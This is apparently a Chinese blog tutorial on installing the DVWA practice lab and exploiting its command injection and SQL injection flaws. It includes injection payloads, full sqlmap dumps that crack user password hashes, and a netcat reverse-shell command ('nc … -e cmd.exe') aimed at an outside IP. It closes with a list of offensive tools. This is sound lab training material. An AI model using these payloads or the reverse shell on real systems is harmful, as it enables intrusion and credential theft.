---
layout: post
title: DVWA靶场安装和使用及漏洞测试
date: 2024-05-09 15:31:36
categories:
  -  网络安全
---

### 安装PHPStudy

> [官网下载PHPStudy](https://www.xp.cn/)

![](https://s21.ax1x.com/2024/05/09/pkVOexK.png)

> 解压，安装

![](https://s21.ax1x.com/2024/05/09/pkVjPhR.png)

### 安装DVWA

> [GitHub下载DVWA](https://github.com/digininja/DVWA)

![](https://s21.ax1x.com/2024/05/09/pkVjmHe.png)

> 修改DVWA中`config`文件夹下的`config.inc.php.dist`

```php
$_DVWA[ 'db_user' ]     = 'root';
$_DVWA[ 'db_password' ] = 'root';
```

> 文件重命名为`.php`

![](https://s21.ax1x.com/2024/05/09/pkVjYDS.png)

> 启动WAMP

![](https://s21.ax1x.com/2024/05/09/pkVj6DU.png)

> 访问localhost/xxx    xxx：你的DVWA文件夹名称

![](https://s21.ax1x.com/2024/05/09/pkVjqVe.png)

> 点击页面最下面的`Create/Reset Database`

> 跳转到登录后
>
> 账号：admin
>
> 密码：password

![](https://s21.ax1x.com/2024/05/09/pkVjO5d.png)

> 成功登录

![](https://s21.ax1x.com/2024/05/09/pkVjv8I.png)

### 使用DVWA

#### 漏洞 - 命令执行 - ping

```bash
cmd1 (& ; | ) cmd2  // 无论前者是否执行成功，后者都执行

cmd1 && cmd2  // 仅在cmd1执行成功后才执行

cmd || cmd2  // 仅在cmd1执行失败后才执行
```

>  常见windows执行

| 命令                                | 说明                 |
| ----------------------------------- | -------------------- |
| whoami                              | 查看当前用户名       |
| ipconfig                            | 查看网卡信息         |
| shutdown -s -t 0                    | 关机                 |
| net user [username] [password] /add | 添加用户             |
| type  [file_name]                   | 查看filename文件内容 |

> 调整安全级别

![](https://s21.ax1x.com/2024/05/09/pkVvhdg.png)

> low - 低级防护
>
> 进入Command Injection
>
> 输入`127.0.0.1 & whoami `攻击成功

![](https://img2.imgtp.com/2024/05/09/waJUqeuy.png)

> Medium - 普通防护

```php
// 不包含 &  |    ||，依旧可以攻破
$substitutions = array(
        '&&' => '',
        ';'  => '',
);
```

>  high - 高级防护

```php
// | 中包含空格，依旧可以攻破
$substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
);
```

> Impossible -  极限防护

```php
<?php

// 检查是否有表单被提交，如果有名为’Submit’的表单项被设置，则执行花括号内的代码。
if( isset( $_POST[ 'Submit' ]  ) ) {
   
    // 调用checkToken函数来验证防跨站请求伪造（CSRF）的token是否有效。
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // 从请求中获取名为’ip’的参数，这通常是用户输入的IP地址。
    $target = $_REQUEST[ 'ip' ];
    //去除目标IP字符串中的转义字符。
    $target = stripslashes( $target );

    // 将IP地址按点（.）分割成四个部分（八位字节）。
    $octet = explode( ".", $target );

    // 检查每个八位字节是否都是数字，并且确保只有四个八位字节。
    if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) {
        // 如果所有八位字节都是数字，重新组合成一个完整的IP地址。
        $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];

        // 检查服务器的操作系统是否是Windows NT系列。
        if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
            // 如果是Windows系统，使用ping命令来ping目标IP地址。
            $cmd = shell_exec( 'ping  ' . $target );
        }
        else {
            // 如果不是Windows系统（即*nix系统），使用ping -c 4命令来ping目标IP地址。
            $cmd = shell_exec( 'ping  -c 4 ' . $target );
        }

        // 将ping命令的结果输出到页面上，使用<pre>标签格式化显示。
        echo "<pre>{$cmd}</pre>";
    }
    else {
        // 如果IP地址不是有效的数字格式，显示错误信息。
        echo '<pre>ERROR: You have entered an invalid IP.</pre>';
    }
}

// 生成新的CSRF防护token。
generateSessionToken();

?>
```

#### 漏洞 - SQL注入

> low - 低级防护

![](https://img2.imgtp.com/2024/05/09/hyDGqP11.png)

```sql
1' union select user(),database()#
```

>  返回结果：

```
ID: 1' union select user(),database()#
First name: root@localhost
Surname: dvwa
```

> 还能查询数据库中有哪些表

```sql
1' union select user,password from users#
```

> 返回

```
ID: 1' union select user,password from users#
First name: admin
Surname: admin
ID: 1' union select user,password from users#
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
ID: 1' union select user,password from users#
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03
ID: 1' union select user,password from users#
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
ID: 1' union select user,password from users#
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
ID: 1' union select user,password from users#
First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

### SQL注入工具 - SQLmap

> kali 中自带 SQLmap

> 使用

```sh
sqlmap -u "http://192.168.126.132/start/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=qvar6v07v8eb39ovee7v2ci263"
```

> 返回：注入成功

```sh
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://192.168.126.132/start/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=qvar6v07v8eb39ovee7v2ci263"
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:12:34 /2024-05-09/

[09:12:34] [INFO] testing connection to the target URL
[09:12:34] [INFO] testing if the target URL content is stable
[09:12:35] [INFO] target URL content is stable
[09:12:35] [INFO] testing if GET parameter 'id' is dynamic
[09:12:35] [WARNING] GET parameter 'id' does not appear to be dynamic
[09:12:35] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[09:12:35] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[09:12:35] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[09:15:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[09:15:06] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[09:15:06] [WARNING] reflective value(s) found and filtering out
[09:15:06] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[09:15:06] [INFO] testing 'Generic inline queries'
[09:15:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[09:15:08] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[09:15:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[09:15:10] [INFO] GET parameter 'id' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable (with --not-string="Me")
[09:15:10] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[09:15:10] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[09:15:10] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[09:15:10] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[09:15:10] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[09:15:10] [INFO] GET parameter 'id' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable                                                                                          
[09:15:10] [INFO] testing 'MySQL inline queries'
[09:15:10] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[09:15:10] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[09:15:10] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[09:15:11] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[09:15:11] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[09:15:11] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[09:15:11] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[09:15:21] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[09:15:21] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[09:15:21] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[09:15:21] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[09:15:21] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[09:15:21] [INFO] target URL appears to have 2 columns in query
[09:15:21] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[09:15:21] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] m
sqlmap identified the following injection point(s) with a total of 150 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=1' OR NOT 8515=8515#&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: id=1' AND GTID_SUBSET(CONCAT(0x71766a7671,(SELECT (ELT(9786=9786,1))),0x717a767a71),9786)-- GeHk&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 1127 FROM (SELECT(SLEEP(5)))wnrT)-- EymM&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=1' UNION ALL SELECT CONCAT(0x71766a7671,0x445475775066446365416c616b727a75535a504b516d575368796a664548764d655075726e427446,0x717a767a71),NULL#&Submit=Submit
---
[09:16:51] [INFO] the back-end DBMS is MySQL
[09:16:51] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
web application technology: PHP 7.3.4, Nginx 1.15.11
back-end DBMS: MySQL >= 5.6
[09:16:51] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.126.132'

[*] ending @ 09:16:51 /2024-05-09/
                                                                                         
┌──(kali㉿kali)-[~]
└─$ 
```

> 获取数据库名称

```sh
sqlmap -u "http://192.168.126.132/start/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=qvar6v07v8eb39ovee7v2ci263" --dbs
```

> log

```sh
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://192.168.126.132/start/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=qvar6v07v8eb39ovee7v2ci263" --dbs
        ___
       __H__                                                                                                       
 ___ ___[(]_____ ___ ___  {1.8.2#stable}                                                                           
|_ -| . ["]     | .'| . |                                                                                          
|___|_  [.]_|_|_|__,|  _|                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                       

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:24:47 /2024-05-09/

[09:24:48] [INFO] resuming back-end DBMS 'mysql' 
[09:24:48] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=1' OR NOT 8515=8515#&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: id=1' AND GTID_SUBSET(CONCAT(0x71766a7671,(SELECT (ELT(9786=9786,1))),0x717a767a71),9786)-- GeHk&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 1127 FROM (SELECT(SLEEP(5)))wnrT)-- EymM&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=1' UNION ALL SELECT CONCAT(0x71766a7671,0x445475775066446365416c616b727a75535a504b516d575368796a664548764d655075726e427446,0x717a767a71),NULL#&Submit=Submit
---
[09:24:48] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.3.4, Nginx 1.15.11
back-end DBMS: MySQL >= 5.6
[09:24:48] [INFO] fetching database names
[09:24:48] [WARNING] reflective value(s) found and filtering out
available databases [5]:
[*] dvwa
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys

[09:24:48] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.126.132'

[*] ending @ 09:24:48 /2024-05-09/
```

> 获取数据库表

```sh
sqlmap -u "http://192.168.126.132/start/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=qvar6v07v8eb39ovee7v2ci263" -D dvwa --tables
```

> 返回

```sh
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://192.168.126.132/start/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=qvar6v07v8eb39ovee7v2ci263" -D dvwa --tables
        ___
       __H__                                                                                                       
 ___ ___[.]_____ ___ ___  {1.8.2#stable}                                                                           
|_ -| . [,]     | .'| . |                                                                                          
|___|_  [)]_|_|_|__,|  _|                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                       

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:30:47 /2024-05-09/

[09:30:47] [INFO] resuming back-end DBMS 'mysql' 
[09:30:47] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=1' OR NOT 8515=8515#&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: id=1' AND GTID_SUBSET(CONCAT(0x71766a7671,(SELECT (ELT(9786=9786,1))),0x717a767a71),9786)-- GeHk&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 1127 FROM (SELECT(SLEEP(5)))wnrT)-- EymM&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=1' UNION ALL SELECT CONCAT(0x71766a7671,0x445475775066446365416c616b727a75535a504b516d575368796a664548764d655075726e427446,0x717a767a71),NULL#&Submit=Submit
---
[09:30:47] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.15.11, PHP 7.3.4
back-end DBMS: MySQL >= 5.6
[09:30:47] [INFO] fetching tables for database: 'dvwa'
[09:30:47] [WARNING] reflective value(s) found and filtering out
Database: dvwa
[2 tables]
+-----------+
| guestbook |
| users     |
+-----------+

[09:30:47] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.126.132'

[*] ending @ 09:30:47 /2024-05-09/
```

> 获取表中的列

```sh
sqlmap -u "http://192.168.126.132/start/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=qvar6v07v8eb39ovee7v2ci263" -D dvwa -T users --columns
```

> 返回

```sh
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://192.168.126.132/start/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=qvar6v07v8eb39ovee7v2ci263" -D dvwa -T users --columns
        ___
       __H__                                                                                                       
 ___ ___["]_____ ___ ___  {1.8.2#stable}                                                                           
|_ -| . [)]     | .'| . |                                                                                          
|___|_  [(]_|_|_|__,|  _|                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                       

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:32:39 /2024-05-09/

[09:32:39] [INFO] resuming back-end DBMS 'mysql' 
[09:32:39] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=1' OR NOT 8515=8515#&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: id=1' AND GTID_SUBSET(CONCAT(0x71766a7671,(SELECT (ELT(9786=9786,1))),0x717a767a71),9786)-- GeHk&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 1127 FROM (SELECT(SLEEP(5)))wnrT)-- EymM&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=1' UNION ALL SELECT CONCAT(0x71766a7671,0x445475775066446365416c616b727a75535a504b516d575368796a664548764d655075726e427446,0x717a767a71),NULL#&Submit=Submit
---
[09:32:39] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.3.4, Nginx 1.15.11
back-end DBMS: MySQL >= 5.6
[09:32:39] [INFO] fetching columns for table 'users' in database 'dvwa'
[09:32:39] [WARNING] reflective value(s) found and filtering out
Database: dvwa
Table: users
[8 columns]
+--------------+-------------+
| Column       | Type        |
+--------------+-------------+
| user         | varchar(15) |
| avatar       | varchar(70) |
| failed_login | int(3)      |
| first_name   | varchar(15) |
| last_login   | timestamp   |
| last_name    | varchar(15) |
| password     | varchar(32) |
| user_id      | int(6)      |
+--------------+-------------+

[09:32:39] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.126.132'

[*] ending @ 09:32:39 /2024-05-09/
```

> 获取数据

```sh
sqlmap -u "http://192.168.126.132/start/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=qvar6v07v8eb39ovee7v2ci263" -D dvwa -T users --dump
```

> 返回，这里不仅得到了数据，还破解了用户的md5加密的密文

```sh
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://192.168.126.132/start/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=qvar6v07v8eb39ovee7v2ci263" -D dvwa -T users --dump
        ___
       __H__                                                                                                       
 ___ ___[']_____ ___ ___  {1.8.2#stable}                                                                           
|_ -| . [.]     | .'| . |                                                                                          
|___|_  [.]_|_|_|__,|  _|                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                       

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:35:25 /2024-05-09/

[09:35:25] [INFO] resuming back-end DBMS 'mysql' 
[09:35:25] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=1' OR NOT 8515=8515#&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: id=1' AND GTID_SUBSET(CONCAT(0x71766a7671,(SELECT (ELT(9786=9786,1))),0x717a767a71),9786)-- GeHk&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 1127 FROM (SELECT(SLEEP(5)))wnrT)-- EymM&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=1' UNION ALL SELECT CONCAT(0x71766a7671,0x445475775066446365416c616b727a75535a504b516d575368796a664548764d655075726e427446,0x717a767a71),NULL#&Submit=Submit
---
[09:35:25] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.15.11, PHP 7.3.4
back-end DBMS: MySQL >= 5.6
[09:35:25] [INFO] fetching columns for table 'users' in database 'dvwa'
[09:35:25] [INFO] fetching entries for table 'users' in database 'dvwa'
[09:35:26] [WARNING] reflective value(s) found and filtering out
[09:35:26] [INFO] recognized possible password hashes in column 'password'


do you want to crack them via a dictionary-based attack? [Y/n/q] y
[09:35:47] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[09:36:04] [INFO] using default dictionary
n
[09:36:29] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[09:36:29] [INFO] starting 4 processes 
[09:36:30] [INFO] cracked password 'abc123' for hash 'e99a18c428cb38d5f260853678922e03'                           
[09:36:31] [INFO] cracked password 'charley' for hash '8d3533d75ae2c3966d7e0d4fcc69216b'                          
[09:36:32] [INFO] cracked password 'letmein' for hash '0d107d09f5bbe40cade3de5c71e9e9b7'                          
[09:36:33] [INFO] cracked password 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99'                         
Database: dvwa                                                                                                    
Table: users
[5 entries]
+---------+---------+-----------------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
| user_id | user    | avatar                            | password                                    | last_name | first_name | last_login          | failed_login |
+---------+---------+-----------------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
| 1       | admin   | /start/hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2024-05-09 16:18:37 | 0            |
| 2       | gordonb | /start/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2024-05-09 16:18:37 | 0            |
| 3       | 1337    | /start/hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2024-05-09 16:18:37 | 0            |
| 4       | pablo   | /start/hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2024-05-09 16:18:37 | 0            |
| 5       | smithy  | /start/hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2024-05-09 16:18:37 | 0            |
+---------+---------+-----------------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+

[09:36:36] [INFO] table 'dvwa.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.126.132/dump/dvwa/users.csv'                                                                                                   
[09:36:36] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.126.132'

[*] ending @ 09:36:36 /2024-05-09/
```

> Impossible - 极限防护

```sh
sqlmap -u "http://192.168.126.132/start/vulnerabilities/sqli/?id=1&Submit=Submit&user_token=8c4acbe4b1a1b27a134e3a21b06645af" --cookie="security=impossible; PHPSESSID=eu2okpp0dfkcqpcifdih3t8j29"
```

> 返回：依旧注入成功

```sh
┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://192.168.126.132/start/vulnerabilities/sqli/?id=1&Submit=Submit&user_token=8c4acbe4b1a1b27a134e3a21b06645af" --cookie="security=impossible; PHPSESSID=eu2okpp0dfkcqpcifdih3t8j29" 
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.2#stable}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:53:16 /2024-05-09/

GET parameter 'user_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] y
[09:53:20] [INFO] resuming back-end DBMS 'mysql' 
[09:53:20] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=1' OR NOT 8515=8515#&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: id=1' AND GTID_SUBSET(CONCAT(0x71766a7671,(SELECT (ELT(9786=9786,1))),0x717a767a71),9786)-- GeHk&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 1127 FROM (SELECT(SLEEP(5)))wnrT)-- EymM&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=1' UNION ALL SELECT CONCAT(0x71766a7671,0x445475775066446365416c616b727a75535a504b516d575368796a664548764d655075726e427446,0x717a767a71),NULL#&Submit=Submit
---
[09:53:20] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.15.11, PHP 7.3.4
back-end DBMS: MySQL >= 5.6
[09:53:20] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.126.132'

[*] ending @ 09:53:20 /2024-05-09/
```



### 额外补充

#### Nmap

>  黑客工具：[Nmap](https://nmap.org/ncat/)

![](https://img2.imgtp.com/2024/05/09/a7vAx0Rm.png)

```sh
# 监听6666端口，并在有连接时提供一个命令行界面。这通常用于远程控制或反向Shell，允许远程用户通过该端口与目标机器的命令行界面进行交互。
[root@iZwz96cshz9sfsdgh3ntwyZ~]#  nc -lvvp 6666
Ncat:Version 7.50( https://nmap.org/ncat )
Ncat:Listening on :::6666
Ncat:Listening on 0.0.0.0:6666
```

>  DVWA  Command Injection 中输入

```
127.0.0.1 & nc 47.115.9.13 6666 -e cmd.exe
```

> 解释

这里的`127.0.0.1`是本地回环地址，通常用于测试本机网络配置。而`&`是Windows操作系统中的命令分隔符，它允许在同一行中执行多个命令。因此，当输入`127.0.0.1 &`时，实际上是先尝试ping本地地址，然后执行`&`后面的命令。

`nc`（或称netcat）是一个网络工具，可以用于建立TCP/UDP连接。在这个例子中，`nc 47.115.9.13 6666 -e cmd.exe`是告诉`nc`连接到IP地址`47.115.9.13`的`6666`端口，并使用`-e`选项将`cmd.exe`（Windows命令行解释器）的执行绑定到这个连接上。这样，远程服务器就可以通过这个端口发送命令，本地的`cmd.exe`会执行这些命令，并将结果返回给远程服务器。

#### Burp Suite

#### zenmap：端口检测工具

#### gorailgun：端口识别工具

#### weblogic漏洞利用工具

#### 蚁剑：weblogic注入木马程序

#### msfvenom绕特征码工具 

#### 攻击工具： fscon64.exe

#### 切换kali输出命令编码

```sh
chcp 65001
```

### cobaltstrike 

有服务端和客户端



融合软件工具

add to Archive



修改图标工具

Restorator

  

D盾

检测工具



查看系统信息工具

Autoruns
